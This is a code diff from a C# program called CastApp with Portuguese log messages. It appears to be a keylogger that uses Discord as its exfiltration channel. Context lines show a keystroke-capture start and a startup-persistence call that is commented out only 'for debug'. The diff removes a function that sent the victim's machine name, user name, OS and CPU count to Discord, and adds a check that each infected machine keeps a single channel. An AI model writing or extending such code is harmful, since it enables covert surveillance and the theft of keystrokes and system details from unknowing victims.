@@ -66,12 +66,6 @@ namespace CastApp
                     // TEMPORARIAMENTE COMENTADO PARA DEBUG
                     //InstallToStartup();
                     LogError("Iniciando captura de teclas...");
-
-                    if (_discordInitialized)
-                    {
-                        await TestDiscordConnection();
-                    }
-
                     StartKeyCapture();
                 }
                 else
@@ -140,6 +134,25 @@ namespace CastApp
 
                     _discordInitialized = true;
                     LogError("=== DISCORD INICIALIZADO COM SUCESSO ===");
+
+                    LogError("=== TESTANDO BUSCA DE CANAIS EXISTENTES ===");
+                    if (_discordLogger != null)
+                    {
+                        var testChannel = await _discordLogger.GetOrCreateMachineChannelAsync(GetMachineName());
+                        LogError($"Primeiro canal: {testChannel.Name} (ID: {testChannel.Id})");
+
+                        var testChannel2 = await _discordLogger.GetOrCreateMachineChannelAsync(GetMachineName());
+                        LogError($"Segundo canal: {testChannel2.Name} (ID: {testChannel2.Id})");
+
+                        if (testChannel.Id == testChannel2.Id)
+                        {
+                            LogError("✅ SUCESSO: Mesmo canal retornado nas duas chamadas");
+                        }
+                        else
+                        {
+                            LogError("❌ ERRO: Canais diferentes retornados");
+                        }
+                    }
                     return;
                 }
                 catch (Exception ex)
@@ -165,36 +178,6 @@ namespace CastApp
 
             LogError("=== FALHA AO INICIALIZAR DISCORD APÓS TODAS AS TENTATIVAS ===");
             _discordInitialized = false;
-        }
-
-        private static async Task TestDiscordConnection()
-        {
-            try
-            {
-                LogError("=== TESTANDO CONEXÃO COM DISCORD ===");
-
-                if (_discordLogger == null)
-                {
-                    LogError("DiscordLogger é null!");
-                    return;
-                }
-
-                await _discordLogger.SendLogAsync(
-                    GetMachineName(),
-                    GetUserName(),
-                    GetOSVersion(),
-                    GetCpuCount(),
-                    "🔥 TESTE DE CONEXÃO - SystemH iniciado com sucesso!"
-                );
-
-                LogError("=== TESTE DE CONEXÃO ENVIADO COM SUCESSO ===");
-            }
-            catch (Exception ex)
-            {
-                LogError($"=== ERRO NO TESTE DE CONEXÃO ===");
-                LogError($"Erro: {ex.Message}");
-                LogError($"StackTrace: {ex.StackTrace}");
-            }
         }
 
         private static void LogError(string message)
